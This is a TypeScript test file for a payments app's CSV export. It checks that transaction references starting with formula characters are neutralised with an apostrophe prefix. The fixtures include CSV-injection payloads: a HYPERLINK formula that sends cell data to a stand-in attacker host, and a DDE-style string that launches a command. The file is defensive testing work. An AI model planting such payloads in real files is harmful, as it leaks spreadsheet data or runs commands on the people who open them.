/**
 * Transactions CSV export: formula (CSV) injection in free-text cells.
 * Requires DATABASE_URL (migrated Postgres).
 */
import assert from "node:assert/strict";
import { randomUUID } from "node:crypto";
import { after, test } from "node:test";
import { Pool } from "pg";
import { buildTransactionsExportCsv } from "./exportCsv.js";

const databaseUrl = process.env.DATABASE_URL;
if (!databaseUrl) {
  throw new Error("exportCsvInjection.test.ts requires DATABASE_URL to point at a real, migrated Postgres");
}

const pool = new Pool({ connectionString: databaseUrl, max: 3 });

after(async () => {
  await pool.end();
});

async function merchantWithReferences(references: string[]): Promise<string> {
  const m = await pool.query<{ id: string }>(
    `INSERT INTO merchants (display_name, mdr_bps) VALUES ($1, 250) RETURNING id`,
    [`CSV Export Test ${randomUUID()}`],
  );
  const merchantId = m.rows[0]!.id;
  let minute = 0;
  for (const reference of references) {
    await pool.query(
      `INSERT INTO transactions (merchant_id, status, amount_fils, captured_fils, reference, acquirer_reference, occurred_at)
       VALUES ($1, 'captured', 4750, 4750, $2, $3, $4)`,
      [merchantId, reference, `acq_${randomUUID()}`, `2026-06-01T10:${String(minute++).padStart(2, "0")}:00Z`],
    );
  }
  return merchantId;
}

test("reference cells that a spreadsheet would evaluate as a formula are neutralised", async () => {
  const merchantId = await merchantWithReferences([
    '=HYPERLINK("http://evil.example/?x="&A1,"click")',
    "+1+cmd|' /C calc'!A0",
    "-2+3",
    "@SUM(1,2)",
    "\t=1+1",
    "order-1001",
  ]);

  const csv = await buildTransactionsExportCsv(pool, { merchantId });
  const references = csv
    .split("\n")
    .slice(1)
    .map((line) => {
      // reference is the 5th column; it may be quoted and contain commas.
      const afterAmounts = line.split(",").slice(4, -1).join(",");
      return afterAmounts;
    });

  for (const cell of references.slice(0, 5)) {
    const unquoted = cell.startsWith('"') ? cell.slice(1) : cell;
    assert.ok(!/^[=+\-@\t\r]/.test(unquoted), `cell must not start with a formula trigger: ${JSON.stringify(cell)}`);
    assert.ok(unquoted.startsWith("'"), `cell must be prefixed with ': ${JSON.stringify(cell)}`);
  }
  assert.equal(references[5], "order-1001", "ordinary references are unchanged");
  assert.ok(csv.includes('"\'=HYPERLINK(""http://evil.example/?x=""&A1,""click"")"'), csv);
});
